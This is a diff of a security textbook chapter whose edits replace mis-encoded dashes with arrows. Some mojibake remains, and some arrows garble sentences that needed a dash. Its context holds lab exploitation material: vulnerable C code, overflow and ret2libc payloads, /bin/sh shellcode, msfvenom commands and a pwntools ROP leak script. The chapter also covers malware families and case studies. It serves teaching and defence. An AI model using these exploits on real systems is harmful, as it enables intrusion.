@@ -1,7 +1,7 @@
 # Chapter 4: System & Software Security
 
-> **Prereq:** Chapter 3 (Network Security) â€” network perimeter controls limit what reaches the host; this chapter assumes that baseline.
-> **Next:** Chapter 5 (Web Security) â€” web applications depend on the OS and software security discussed here.
+> **Prereq:** Chapter 3 (Network Security) → network perimeter controls limit what reaches the host; this chapter assumes that baseline.
+> **Next:** Chapter 5 (Web Security) → web applications depend on the OS and software security discussed here.
 
 ---
 
@@ -284,10 +284,10 @@ Set-AppLockerPolicy -Policy $policy -RuleType Exe -Audit
 
 #### 1.3.5 Patch Management (WSUS)
 
-Group Policy â†’ Windows Update â†’ Configure Automatic Updates:
+Group Policy → Windows Update → Configure Automatic Updates:
 - 4 = Auto download and schedule install
 - Install during maintenance: Daily at 3 AM
-- Specify intranet Microsoft update service location â†’ WSUS server
+- Specify intranet Microsoft update service location → WSUS server
 
 #### 1.3.6 Practical: Sysinternals Suite
 
@@ -313,9 +313,9 @@ Shows every autostart location:
 ```
 
 **Practical usage for malware analysis:**
-1. Run Autoruns â†’ Hide Microsoft entries â†’ examine suspicious entries
-2. Run Process Monitor â†’ filter on suspicious processâ†’ capture file/registry/network ops
-3. Check with Process Explorer â†’ look for DLL injection (View â†’ Lower Pane â†’ DLLs)
+1. Run Autoruns → Hide Microsoft entries → examine suspicious entries
+2. Run Process Monitor → filter on suspicious process→ capture file/registry/network ops
+3. Check with Process Explorer → look for DLL injection (View → Lower Pane → DLLs)
 
 ---
 
@@ -324,11 +324,11 @@ Shows every autostart location:
 | Category | Linux | Windows |
 |----------|-------|---------|
 | **Patch Level** | `apt update && apt upgrade` | Windows Update / WSUS |
-| **Account Policies** | PAM pwquality, lockout after 5 failures | secpol.msc â†’ password/account lockout |
+| **Account Policies** | PAM pwquality, lockout after 5 failures | secpol.msc → password/account lockout |
 | **Firewall** | `ufw enable` or `iptables` | Windows Defender Firewall with Advanced Security |
 | **App Control** | SELinux/AppArmor mandatory profiles | AppLocker or WDAC |
 | **AV/EDR** | ClamAV + rkhunter + chkrootkit | Microsoft Defender + MDE |
-| **Logging** | auditd + rsyslog â†’ SIEM | Windows Event Log â†’ Event Subscription + SIEM |
+| **Logging** | auditd + rsyslog → SIEM | Windows Event Log → Event Subscription + SIEM |
 | **File Integrity** | AIDE or Tripwire | Sysinternals Sigcheck, FCIV |
 | **Boot Security** | GRUB password, Secure Boot | Secure Boot, BitLocker, TPM |
 | **Kernel Protections** | sysctl hardening (aslr, rp_filter, etc.) | Exploit Protection in Windows Defender |
@@ -343,10 +343,10 @@ Shows every autostart location:
 ### 2.1 Memory Layout of a Process
 
 **Analogy:** A process's memory is like a multi-story office building:
-- **Text (Code) segment** â€” the blueprints (read-only instructions)
-- **Data segment** â€” permanent filing cabinets (global/static variables)
-- **Heap** â€” flexible storage room that grows on demand (dynamic allocation)
-- **Stack** â€” the desk where you pile papers for the current task (local variables, function frames), grows downward
+- **Text (Code) segment** → the blueprints (read-only instructions)
+- **Data segment** → permanent filing cabinets (global/static variables)
+- **Heap** → flexible storage room that grows on demand (dynamic allocation)
+- **Stack** → the desk where you pile papers for the current task (local variables, function frames), grows downward
 
 ```
 High Address
@@ -374,14 +374,14 @@ Low Address
 
 #### 2.2.1 Anatomy
 
-**Analogy:** You have a stack of papers on your desk labeled "buffer[16]". Someone hands you 50 pages to file. You keep stuffing them into the buffer folder, and they spill over, covering your sticky note that says "remember to return to the main office (return address)". When you finish, you look at the sticky note â€” it's been overwritten with "go to the attacker's office instead."
+**Analogy:** You have a stack of papers on your desk labeled "buffer[16]". Someone hands you 50 pages to file. You keep stuffing them into the buffer folder, and they spill over, covering your sticky note that says "remember to return to the main office (return address)". When you finish, you look at the sticky note → it's been overwritten with "go to the attacker's office instead."
 
 A stack buffer overflow occurs when a program writes more data to a stack-allocated buffer than its allocated size. The excess overwrites adjacent memory: saved base pointer, return address, and potentially function arguments.
 
 #### 2.2.2 Vulnerable C Program
 
 ```c
-// vuln.c â€” compile with: gcc -fno-stack-protector -z execstack -no-pie -m32 -o vuln vuln.c
+// vuln.c → compile with: gcc -fno-stack-protector -z execstack -no-pie -m32 -o vuln vuln.c
 #include <stdio.h>
 #include <string.h>
 
@@ -393,7 +393,7 @@ void vulnerable(char *input) {
     char buffer[64];              // 64-byte buffer on stack
     printf("Buffer at: %p\n", buffer);
     printf("Secret function at: %p\n", secret_function);
-    strcpy(buffer, input);        // NO bounds check â€” classic overflow
+    strcpy(buffer, input);        // NO bounds check → classic overflow
 }
 
 int main(int argc, char *argv[]) {
@@ -425,7 +425,7 @@ High Address
 +---------------------------+
 | argv, argc (caller args)   | â† main's stack frame
 +---------------------------+
-| return address (to main)  | â† 4 bytes â€” where vulnerable returns
+| return address (to main)  | â† 4 bytes → where vulnerable returns
 +---------------------------+
 | saved EBP (frame pointer) | â† 4 bytes
 +---------------------------+
@@ -493,7 +493,7 @@ eip            0x51515151       0x51515151    # overwritten with 'QQQQ' (0x51 = 
 
 **Finding the offset:** Pattern tells us return address offset = 76 bytes (64 buffer + 12 alignment/padding).
 
-#### 2.2.5 Exploiting â€” Redirecting to secret_function
+#### 2.2.5 Exploiting → Redirecting to secret_function
 
 ```bash
 # Calculate: buffer(64) + saved_ebp(4) + padding(8) = 76 bytes padding, then target address
@@ -536,9 +536,9 @@ YOU WIN! Secret function executed.
 
 #### 2.3.1 Anatomy
 
-**Analogy:** The heap is like a community storage shed. You check out a box (malloc), but you put more stuff in it than it can hold. The excess spills into the next person's box. When they open their box, they find your stuff, or worse â€” the shed manager's ledger is right next to your box, and you overwrite who owns what.
+**Analogy:** The heap is like a community storage shed. You check out a box (malloc), but you put more stuff in it than it can hold. The excess spills into the next person's box. When they open their box, they find your stuff, or worse → the shed manager's ledger is right next to your box, and you overwrite who owns what.
 
-Heap overflows corrupt heap metadata â€” chunk headers with size fields, forward/backward free-list pointers â€” leading to arbitrary write when `free()` processes the corrupted chunk.
+Heap overflows corrupt heap metadata → chunk headers with size fields, forward/backward free-list pointers → leading to arbitrary write when `free()` processes the corrupted chunk.
 
 #### 2.3.2 Vulnerable C Program
 
@@ -558,7 +558,7 @@ int main(int argc, char *argv[]) {
     printf("secret at %p: %s\n", secret, secret);
     printf("buffer at %p\n", buffer);
 
-    strcpy(buffer, argv[1]);    // OVERFLOW â€” writes past buffer into secret
+    strcpy(buffer, argv[1]);    // OVERFLOW → writes past buffer into secret
     printf("secret after overflow: %s\n", secret);
 
     free(buffer);
@@ -596,7 +596,7 @@ char *ptr = malloc(16);
 strcpy(ptr, "hello");
 free(ptr);              // memory freed
 // ... attacker controls the allocator state ...
-printf("%s\n", ptr);    // USE AFTER FREE â€” dangling pointer
+printf("%s\n", ptr);    // USE AFTER FREE → dangling pointer
 ```
 
 #### 2.3.4 Complexity Analysis
@@ -634,7 +634,7 @@ typedef struct _EXCEPTION_REGISTRATION_RECORD {
 The `Handler` field points to the exception handler. An overflow can overwrite this pointer. When an exception fires (access violation after overflow), the corrupted handler executes attacker code.
 
 **Practical exploitation (SafeSEH bypass):**
-1. Overflow buffer â†’ overwrite SEH handler pointer
+1. Overflow buffer → overwrite SEH handler pointer
 2. Trigger exception (e.g., write to invalid memory)
 3. Handler executes attacker-controlled address
 
@@ -646,14 +646,14 @@ Modern mitigations: SafeSEH (validates handler address), SEHOP (validates chain 
 
 | Defense | Description | Bypass | Effectiveness |
 |---------|-------------|--------|---------------|
-| **Stack Canary** | Random value placed before return address; checked before `ret` | Info leak to read canary value; or overwrite canary with itself if fork-based server | High â€” default in GCC/Clang (`-fstack-protector`) |
+| **Stack Canary** | Random value placed before return address; checked before `ret` | Info leak to read canary value; or overwrite canary with itself if fork-based server | High → default in GCC/Clang (`-fstack-protector`) |
 | **ASLR** | Randomizes base addresses of stack, heap, libc, PIE binary | Info leak (format string, side channel) or brute-force (32-bit: ~2^16) | High on 64-bit (28+ bits entropy) |
-| **DEP/NX** | Marks stack/heap as non-executable; CPU refuses to execute code there | ROP â€” reuse existing code (libc gadgets) | Very high against shellcode injection |
+| **DEP/NX** | Marks stack/heap as non-executable; CPU refuses to execute code there | ROP → reuse existing code (libc gadgets) | Very high against shellcode injection |
 | **CFG** (Control Flow Guard) | Inserted checks at indirect call sites verify target is in valid function table | Find function with CFG check disabled or bypass the check | High on Windows 10+ |
-| **SEHOP** (SEH Overwrite Protection) | Validates SEH chain integrity before dispatching exception | Corrupt SEH chain pointer to a valid-looking fake chain | Moderate â€” can be bypassed if attacker controls chain pointer |
-| **SafeSEH** | Validates exception handler address is within a registered module | Use module not compiled with SafeSEH; or address in non-SafeSEH module | Moderate â€” varies by module |
-| **PIE** (Position Independent Executable) | Randomizes code base address (extends ASLR to binary itself) | Info leak of binary base | High â€” default in modern Linux distros |
-| **RELRO** | Makes GOT read-only after relocation (Full RELRO) | Partial RELRO: overwrite GOT entry; Full RELRO: need other targets | High â€” Full RELRO prevents GOT overwrite |
+| **SEHOP** (SEH Overwrite Protection) | Validates SEH chain integrity before dispatching exception | Corrupt SEH chain pointer to a valid-looking fake chain | Moderate → can be bypassed if attacker controls chain pointer |
+| **SafeSEH** | Validates exception handler address is within a registered module | Use module not compiled with SafeSEH; or address in non-SafeSEH module | Moderate → varies by module |
+| **PIE** (Position Independent Executable) | Randomizes code base address (extends ASLR to binary itself) | Info leak of binary base | High → default in modern Linux distros |
+| **RELRO** | Makes GOT read-only after relocation (Full RELRO) | Partial RELRO: overwrite GOT entry; Full RELRO: need other targets | High → Full RELRO prevents GOT overwrite |
 
 ---
 
@@ -661,9 +661,9 @@ Modern mitigations: SafeSEH (validates handler address), SEHOP (validates chain 
 
 ### 3.1 What Is Shellcode?
 
-**Analogy:** Shellcode is like a skeleton key. Instead of being a full replacement key (program), it's a tiny piece of precisely machined metal (minimal machine code) that does exactly one thing â€” open the door (spawn a shell). It must fit in tight spaces (small buffer) and avoid breaking the lock (null-byte-free).
+**Analogy:** Shellcode is like a skeleton key. Instead of being a full replacement key (program), it's a tiny piece of precisely machined metal (minimal machine code) that does exactly one thing → open the door (spawn a shell). It must fit in tight spaces (small buffer) and avoid breaking the lock (null-byte-free).
 
-Shellcode is position-independent machine code that executes the attacker's intent â€” typically spawning a shell (`/bin/sh`), creating a reverse shell, or adding a backdoor user.
+Shellcode is position-independent machine code that executes the attacker's intent → typically spawning a shell (`/bin/sh`), creating a reverse shell, or adding a backdoor user.
 
 **Constraints:**
 - Must be position-independent (PIC)
@@ -674,7 +674,7 @@ Shellcode is position-independent machine code that executes the attacker's inte
 ### 3.2 Writing Shellcode in Assembly (Linux x86)
 
 ```assembly
-; shellcode.asm â€” execve("/bin/sh", NULL, NULL) â€” 23 bytes, null-free
+; shellcode.asm → execve("/bin/sh", NULL, NULL) → 23 bytes, null-free
 ; nasm -f elf32 shellcode.asm -o shellcode.o
 ; ld -m elf_i386 -o shellcode shellcode.o
 
@@ -736,7 +736,7 @@ int main() {
 $ gcc -z execstack -o test_shellcode test_shellcode.c
 $ ./test_shellcode
 Shellcode length: 23
-$                         # Shell spawned â€” exit with Ctrl+D
+$                         # Shell spawned → exit with Ctrl+D
 ```
 
 ### 3.3 Practical: msfvenom Shellcode Generation
@@ -801,22 +801,22 @@ msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed -f c
 ```
 Before overflow:
 +-------------------+
-| return address    | â†’ overwrite with address of system() in libc
+| return address    | → overwrite with address of system() in libc
 +-------------------+
-| saved EBP         | â†’ overwrite with junk or valid frame
+| saved EBP         | → overwrite with junk or valid frame
 +-------------------+
 | buffer[64]        |
 +-------------------+
 
 After overflow layout:
 +-------------------+
-| &system()         | â†’ overwrites return address
+| &system()         | → overwrites return address
 +-------------------+
-| fake ret after    | â†’ address to return after system() (or junk)
+| fake ret after    | → address to return after system() (or junk)
 +-------------------+
-| pointer to cmd    | â†’ first argument to system() â†’ in our case "/bin/sh"
+| pointer to cmd    | → first argument to system() → in our case "/bin/sh"
 +-------------------+
-| "/bin/sh\0"       | â†’ string in buffer or in libc itself
+| "/bin/sh\0"       | → string in buffer or in libc itself
 +-------------------+
 | padding           |
 +-------------------+
@@ -841,19 +841,19 @@ $ ./vuln $(python2 -c 'print "A"*76 + "\x00\xd2\x03\xf7" + "FAKE" + "\xf3\xe0\x1
 
 ### 4.2 Return-Oriented Programming (ROP)
 
-**Analogy:** ROP is like building with LEGO bricks. Each brick (gadget) is a tiny pre-built piece â€” "move this value here," "add these two," "return." You can't make new bricks (DEP), but you can chain existing ones to build anything. A ROP chain is a sequence of these bricks that together execute arbitrary computation â€” all from existing code.
+**Analogy:** ROP is like building with LEGO bricks. Each brick (gadget) is a tiny pre-built piece → "move this value here," "add these two," "return." You can't make new bricks (DEP), but you can chain existing ones to build anything. A ROP chain is a sequence of these bricks that together execute arbitrary computation → all from existing code.
 
 **Concept:** ROP chains small instruction sequences ending in `ret` (gadgets) to perform arbitrary computation. Each gadget's address is placed on the stack; `ret` pops the next gadget address and executes it.
 
 **How gadgets work:**
 ```
 Gadget example:
-pop rdi; ret    â€” at address 0x7f123456
+pop rdi; ret    → at address 0x7f123456
 
 Stack during ROP execution:
-[0x7f123456]    â†’ pop rdi â†’ rdi = next value on stack; ret â†’ next gadget
-[0xdeadbeef]    â†’ value loaded into rdi
-[0x7f123abc]    â†’ next gadget address
+[0x7f123456]    → pop rdi → rdi = next value on stack; ret → next gadget
+[0xdeadbeef]    → value loaded into rdi
+[0x7f123abc]    → next gadget address
 ```
 
 #### 4.2.1 Finding Gadgets with ropper
@@ -987,7 +987,7 @@ payload1 += p32(puts_plt)      # return to puts@PLT
 payload1 += p32(main_addr)     # return to main after puts
 payload1 += p32(puts_got)      # argument: puts@GOT
 
-# Run â€” captures leaked address
+# Run → captures leaked address
 p = process('./vuln')
 p.sendline(payload1)
 leaked = u32(p.recv(4))
@@ -1023,28 +1023,28 @@ p.interactive()
 ### 5.1 Malware Classification
 
 **Analogy:** Malware families are like parasites in a biological ecosystem:
-- **Virus** â€” attaches to a host program (like a tapeworm)
-- **Worm** â€” self-replicates across the network (like an invasive species)
-- **Trojan** â€” disguises as something beneficial (like a cuckoo egg)
-- **Ransomware** â€” holds your data hostage (like a kidnapper)
-- **Rootkit** â€” hides its presence (like a chameleon)
-- **Botnet** â€” enslaved network (like a zombie horde)
-- **RAT** â€” remote control (like a puppet master)
-- **Spyware** â€” watches everything (like hidden cameras)
-- **Adware** â€” unwanted advertisements (like spam mail)
-- **Fileless** â€” lives only in memory (like a ghost)
+- **Virus** → attaches to a host program (like a tapeworm)
+- **Worm** → self-replicates across the network (like an invasive species)
+- **Trojan** → disguises as something beneficial (like a cuckoo egg)
+- **Ransomware** → holds your data hostage (like a kidnapper)
+- **Rootkit** → hides its presence (like a chameleon)
+- **Botnet** → enslaved network (like a zombie horde)
+- **RAT** → remote control (like a puppet master)
+- **Spyware** → watches everything (like hidden cameras)
+- **Adware** → unwanted advertisements (like spam mail)
+- **Fileless** → lives only in memory (like a ghost)
 
 #### 5.1.1 Virus
 
 **Propagation:** Infects executable files, boot sectors, or macro scripts. Requires human action (running infected program, opening infected document).
 
-**Payload:** Varies â€” data corruption, credential theft, backdoor installation.
+**Payload:** Varies → data corruption, credential theft, backdoor installation.
 
 **Persistence:** Modifies host file, adds self to startup, infects system binaries.
 
 **Detection:** Signature-based AV, behavioral analysis (file modification patterns).
 
-**Example:** CIH (Chernobyl) virus â€” overwrites BIOS, renders system unbootable.
+**Example:** CIH (Chernobyl) virus → overwrites BIOS, renders system unbootable.
 
 #### 5.1.2 Worm
 
@@ -1052,11 +1052,11 @@ p.interactive()
 
 **Payload:** DoS (distributed), dropper for other malware, data theft.
 
-**Persistence:** Often no disk persistence â€” runs in memory, spreads aggressively.
+**Persistence:** Often no disk persistence → runs in memory, spreads aggressively.
 
 **Detection:** Network traffic analysis (unusual connection patterns), IDS signatures.
 
-**Example:** Morris Worm (1988) â€” exploited fingerd buffer overflow, replicated via rsh/rexec.
+**Example:** Morris Worm (1988) → exploited fingerd buffer overflow, replicated via rsh/rexec.
 
 #### 5.1.3 Trojan
 
@@ -1068,7 +1068,7 @@ p.interactive()
 
 **Detection:** AV scanning, code signing verification, behavioral analysis.
 
-**Example:** Zeus trojan â€” banking credential theft via web injects.
+**Example:** Zeus trojan → banking credential theft via web injects.
 
 #### 5.1.4 Ransomware
 
@@ -1080,7 +1080,7 @@ p.interactive()
 
 **Detection:** File system monitoring (mass file rename/encrypt), behavioral EDR.
 
-**Example:** WannaCry (2017) â€” used EternalBlue exploit, encrypted 200K+ systems across 150 countries.
+**Example:** WannaCry (2017) → used EternalBlue exploit, encrypted 200K+ systems across 150 countries.
 
 #### 5.1.5 Rootkit
 
@@ -1092,7 +1092,7 @@ p.interactive()
 
 **Detection:** Memory forensics (Volatility), boot-time scanning, hardware security modules.
 
-**Example:** Sony BMG rootkit (2005) â€” hid DRM software via cloaking techniques.
+**Example:** Sony BMG rootkit (2005) → hid DRM software via cloaking techniques.
 
 #### 5.1.6 Botnet
 
@@ -1104,19 +1104,19 @@ p.interactive()
 
 **Detection:** C2 traffic pattern analysis (beaconing, DGA domains).
 
-**Example:** Mirai (2016) â€” IoT botnet, 600K+ devices, 1.2 Tbps DDoS on Dyn DNS.
+**Example:** Mirai (2016) → IoT botnet, 600K+ devices, 1.2 Tbps DDoS on Dyn DNS.
 
 #### 5.1.7 RAT (Remote Access Trojan)
 
 **Propagation:** Trojan delivery (phishing, fake downloads).
 
-**Payload:** Full remote control â€” screen capture, keylogging, file transfer, webcam access.
+**Payload:** Full remote control → screen capture, keylogging, file transfer, webcam access.
 
 **Persistence:** Registry auto-run, service installation, DLL hijacking.
 
 **Detection:** Network traffic analysis (encrypted C2 tunnel), process anomalies.
 
-**Example:** DarkComet â€” full-featured RAT with keylogger, screen capture, microphone access.
+**Example:** DarkComet → full-featured RAT with keylogger, screen capture, microphone access.
 
 #### 5.1.8 Spyware
 
@@ -1128,7 +1128,7 @@ p.interactive()
 
 **Detection:** Anti-spyware tools (Malwarebytes, Spybot), browser settings anomalies.
 
-**Example:** CoolWebSearch â€” browser hijacker that redirects all searches.
+**Example:** CoolWebSearch → browser hijacker that redirects all searches.
 
 #### 5.1.9 Adware
 
@@ -1138,19 +1138,19 @@ p.interactive()
 
 **Detection:** Ad-blockers, anti-malware with PUP detection.
 
-**Example:** Delta Search â€” browser toolbar that injects ads.
+**Example:** Delta Search → browser toolbar that injects ads.
 
 #### 5.1.10 Fileless Malware
 
 **Propagation:** Exploit (e.g., PowerShell downgrade attack), malicious document macros.
 
-**Payload:** Runs entirely in memory â€” PowerShell scripts, WMI persistence, .NET assemblies.
+**Payload:** Runs entirely in memory → PowerShell scripts, WMI persistence, .NET assemblies.
 
 **Persistence:** WMI event subscriptions, registry run keys (minimal), scheduled tasks.
 
 **Detection:** Process tree analysis, PowerShell script block logging (Event ID 4104), memory forensics.
 
-**Example:** Kovter â€” used PowerShell for execution, stored payload in registry.
+**Example:** Kovter → used PowerShell for execution, stored payload in registry.
 
 ### 5.2 Malware Types Comparison Table
 
@@ -1209,12 +1209,12 @@ End Date:   2024:01:15 14:30:55
 
 ```
 Key PEStudio indicators:
-- Entropy > 7.0 in sections â†’ packed/encrypted
-- TLS callbacks â†’ anti-debugging
+- Entropy > 7.0 in sections → packed/encrypted
+- TLS callbacks → anti-debugging
 - Suspicious imports: VirtualAlloc, CreateRemoteThread, WriteProcessMemory
-- Rich header mismatch â†’ masquerading
-- Untrusted digital signature â†’ trojanized software
-- High string entropy â†’ obfuscated/encoded payloads
+- Rich header mismatch → masquerading
+- Untrusted digital signature → trojanized software
+- High string entropy → obfuscated/encoded payloads
 ```
 
 **HashDiff** compares file hashes to detect binary changes:
@@ -1237,7 +1237,7 @@ Get-ChildItem -Path . -Recurse -File | Get-FileHash -Algorithm MD5 | Group-Objec
 
 ### 6.1 SSDLC Phases
 
-**Analogy:** Building secure software is like constructing a fortress. You don't add defenses after the castle is built â€” you design moats into the blueprints, use fire-resistant stone during construction, test the drawbridge before opening, and maintain patrols year after year.
+**Analogy:** Building secure software is like constructing a fortress. You don't add defenses after the castle is built → you design moats into the blueprints, use fire-resistant stone during construction, test the drawbridge before opening, and maintain patrols year after year.
 
 ```mermaid
 flowchart LR
@@ -1265,7 +1265,7 @@ flowchart LR
 | Abuse cases | "What if someone tries to misuse this?" |
 | Security acceptance criteria | Definition of "secure enough" |
 
-#### Phase 2: Design â€” Threat Modeling
+#### Phase 2: Design → Threat Modeling
 
 **STRIDE** (Microsoft):
 
@@ -1279,11 +1279,11 @@ flowchart LR
 | **E**levation of Privilege | Authorization | User becomes admin |
 
 **DREAD** (Risk Scoring):
-- **D**amage Potential â€” how severe is the damage?
-- **R**eproducibility â€” how reliably can the attack succeed?
-- **E**xploitability â€” how easy is it to launch?
-- **A**ffected Users â€” how many users are impacted?
-- **D**iscoverability â€” how likely is the vulnerability to be found?
+- **D**amage Potential → how severe is the damage?
+- **R**eproducibility → how reliably can the attack succeed?
+- **E**xploitability → how easy is it to launch?
+- **A**ffected Users → how many users are impacted?
+- **D**iscoverability → how likely is the vulnerability to be found?
 
 Each rated 1-10, summed for priority.
 
@@ -1297,7 +1297,7 @@ A 7-stage risk-centric methodology:
 6. Attack modeling
 7. Risk and impact analysis
 
-#### Phase 3: Implementation â€” Secure Coding Standards
+#### Phase 3: Implementation → Secure Coding Standards
 
 See Section 6.2 for language-specific guidelines.
 
@@ -1430,7 +1430,7 @@ execFile('grep', [userInput, '/var/log/app.log'], { shell: false }, (err, stdout
 2. Mutate input (bit flips, arithmetic, splicing)
 3. Run program with mutated input
 4. Measure code coverage (new paths discovered?)
-5. If new coverage â†’ add input to queue for further mutation
+5. If new coverage → add input to queue for further mutation
 6. Repeat millions of times
 
 ### 7.2 Practical: AFL (American Fuzzy Lop)
@@ -1516,7 +1516,7 @@ eip            0x51515151       0x51515151
 
 ### 8.1 Static Analysis (SAST)
 
-**Analogy:** Static analysis is like a food critic reviewing a recipe by reading it â€” they check ingredients, technique, and timing without actually cooking anything. Bugs found early in the recipe are cheaper to fix.
+**Analogy:** Static analysis is like a food critic reviewing a recipe by reading it → they check ingredients, technique, and timing without actually cooking anything. Bugs found early in the recipe are cheaper to fix.
 
 #### 8.1.1 Flawfinder
 
@@ -1590,7 +1590,7 @@ vuln.c:9: Medium: fixed length local buffer
 
 ### 8.2 Dynamic Analysis (DAST)
 
-**Analogy:** Dynamic analysis is taste-testing the cooked meal â€” you find issues that only appear when the food is actually made (runtime config, memory states, race conditions).
+**Analogy:** Dynamic analysis is taste-testing the cooked meal → you find issues that only appear when the food is actually made (runtime config, memory states, race conditions).
 
 | Technique | Tools | Finds |
 |-----------|-------|-------|
@@ -1641,7 +1641,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ## Section 9: Case Studies
 
-### 9.1 SolarWinds (2020) â€” Supply Chain Attack
+### 9.1 SolarWinds (2020) → Supply Chain Attack
 
 **Analogy:** A trusted package delivery company (SolarWinds) was compromised. Every box they delivered afterward contained a bug. Customers trusted the box because of the delivery company's reputation.
 
@@ -1675,7 +1675,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 - Exfiltrated data via `SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer` fake telemetry
 
 **SUPERNOVA (webshell):**
-- Separate malware (not SUNBURST) â€” a C# webshell
+- Separate malware (not SUNBURST) → a C# webshell
 - Deployed via IIS application pool
 - Imported as `app_web_*.dll` (auto-compiled ASP.NET)
 - Provided persistent HTTP backdoor
@@ -1694,7 +1694,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ---
 
-### 9.2 NotPetya (2017) â€” Ransomware/Wiper
+### 9.2 NotPetya (2017) → Ransomware/Wiper
 
 **Analogy:** A bomb disguised as a kidnapping. The attackers demanded a ransom, but even if you paid, there was no key. NotPetya looked like ransomware but was designed to permanently destroy data.
 
@@ -1711,10 +1711,10 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 **Technical Breakdown:**
 
-**Initial Vector â€” ME Doc Supply Chain:**
+**Initial Vector → ME Doc Supply Chain:**
 - Attackers compromised the ME Doc update server (Ukraine)
 - Signed digital certificate used to sign the trojanized update
-- ME Doc had automatic updates â€” installation was instant and trusted
+- ME Doc had automatic updates → installation was instant and trusted
 
 **Propagation (Lateral Movement):**
 1. **EternalBlue (SMBv1 exploit):** Same exploit used by WannaCry, patched by MS17-010
@@ -1741,7 +1741,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 **Why It Was a Wiper (Not Ransomware):**
 - Payment mechanism was broken: email provider was taken down
 - Encryption was flawed: private key was hashed from system info
-- Even paying couldn't decrypt â€” the goal was destruction
+- Even paying couldn't decrypt → the goal was destruction
 
 **Lessons:**
 - Supply chain attacks bypass traditional perimeter
@@ -1751,7 +1751,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 
 ---
 
-### 9.3 Stuxnet (2010) â€” From a Code Perspective
+### 9.3 Stuxnet (2010) → From a Code Perspective
 
 **Analogy:** A guided missile that traveled through multiple locked doors, disguised itself as maintenance staff, and sabotaged a specific factory machine without the factory manager ever knowing.
 
@@ -1782,7 +1782,7 @@ SUMMARY: AddressSanitizer: stack-buffer-overflow vuln.c:9 in vulnerable
 **Code Facts:**
 - 15,000+ lines of code across multiple components
 - Multiple programming languages: C++, C, assembly
-- Used valid digital certificates (RealTek, JMicron) â€” stolen from Taiwanese hardware companies
+- Used valid digital certificates (RealTek, JMicron) → stolen from Taiwanese hardware companies
 - Four zero-day exploits (MS10-046, MS10-061, MS10-073, MS10-092)
 - Two stolen certificates
 - Peer-to-peer update mechanism (unusual for worms at the time)
@@ -1827,7 +1827,7 @@ int hooked_ReadS7Block(int blockNum, void *buffer) {
 
 ---
 
-### 9.4 Morris Worm (1988) â€” First Internet Worm
+### 9.4 Morris Worm (1988) → First Internet Worm
 
 **Analogy:** A biologist released a test population of bugs to study their spread, but the bugs reproduced so fast they choked the entire forest.
 
@@ -1895,13 +1895,13 @@ int should_infect() {
 
 **The fingerd Buffer Overflow (in C):**
 ```c
-// fingerd â€” simplified vulnerable code
+// fingerd → simplified vulnerable code
 #include <stdio.h>
 #include <stdlib.h>
 
 void process_request() {
     char query[512];       // fixed-size buffer
-    gets(query);            // reads from stdin into buffer â€” NO BOUNDS CHECK
+    gets(query);            // reads from stdin into buffer → NO BOUNDS CHECK
     // ... process finger query ...
 }
 
@@ -1924,7 +1924,7 @@ int main() {
 
 ### Q1: What is a stack buffer overflow? Explain with stack frame layout.
 
-**A:** A stack buffer overflow occurs when a program writes more data to a stack-allocated buffer than its allocated size, overwriting adjacent stack memory â€” specifically the saved base pointer and return address.
+**A:** A stack buffer overflow occurs when a program writes more data to a stack-allocated buffer than its allocated size, overwriting adjacent stack memory → specifically the saved base pointer and return address.
 
 **Stack frame layout during a function call:**
 ```
@@ -1941,7 +1941,7 @@ High Address
 Low Address (ESP points here)
 ```
 
-When the buffer overflows, data spills from "local variables" up through saved EBP and return address. When the function executes `ret`, it jumps to the overwritten address â€” attacker-controlled.
+When the buffer overflows, data spills from "local variables" up through saved EBP and return address. When the function executes `ret`, it jumps to the overwritten address → attacker-controlled.
 
 ### Q2: How does ASLR work and how can it be bypassed?
 
@@ -1963,13 +1963,13 @@ When the buffer overflows, data spills from "local variables" up through saved E
 
 **A:** A ROP chain is a sequence of gadget addresses placed on the stack. Each gadget is 2-6 bytes ending in `ret`. Execution flows:
 
-1. First `ret` pops gadget1 address â†’ executes `pop rdi; ret`
-2. Gadget1's `pop rdi` pops the next stack value into rdi â†’ `ret` pops gadget2
+1. First `ret` pops gadget1 address → executes `pop rdi; ret`
+2. Gadget1's `pop rdi` pops the next stack value into rdi → `ret` pops gadget2
 3. Chain continues until the attacker's goal is achieved
 
 **Example chain for `execve("/bin/sh", NULL, NULL)` on x86_64:**
 ```
-[pop_rdi] â†’ [&"/bin/sh"] â†’ [pop_rsi] â†’ [0] â†’ [pop_rdx] â†’ [0] â†’ [pop_rax] â†’ [59] â†’ [syscall]
+[pop_rdi] → [&"/bin/sh"] → [pop_rsi] → [0] → [pop_rdx] → [0] → [pop_rax] → [59] → [syscall]
 ```
 Each bracket is 8 bytes on the stack. `ret` instructions advance execution through the chain.
 
@@ -2001,16 +2001,16 @@ Key gadgets needed: `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret`, `pop rax; re
 
 ### Q7: What is the difference between a virus and a worm?
 
-**A:** A **virus** requires a host file (executable, document, boot sector) and human action to spread (opening infected file, running infected program). A **worm** is self-contained and self-propagating â€” it spreads across networks without any user action by exploiting vulnerabilities or weak credentials.
+**A:** A **virus** requires a host file (executable, document, boot sector) and human action to spread (opening infected file, running infected program). A **worm** is self-contained and self-propagating → it spreads across networks without any user action by exploiting vulnerabilities or weak credentials.
 
-The Morris Worm (1988) is the classic example of a worm: it propagated via fingerd buffer overflow, sendmail DEBUG, and rsh password guessing â€” all automated, without user interaction.
+The Morris Worm (1988) is the classic example of a worm: it propagated via fingerd buffer overflow, sendmail DEBUG, and rsh password guessing → all automated, without user interaction.
 
 ### Q8: How would you analyze a suspicious binary without running it?
 
 **A:** Static analysis approach:
 
 1. **File type:** `file malware.exe` (PE, ELF, Mach-O, script)
-2. **Hashing:** SHA256 â†’ search on VirusTotal, MalwareBazaar
+2. **Hashing:** SHA256 → search on VirusTotal, MalwareBazaar
 3. **Strings:** `strings malware.exe | grep -i "http\|cmd\|encrypt\|decrypt\|registry"`
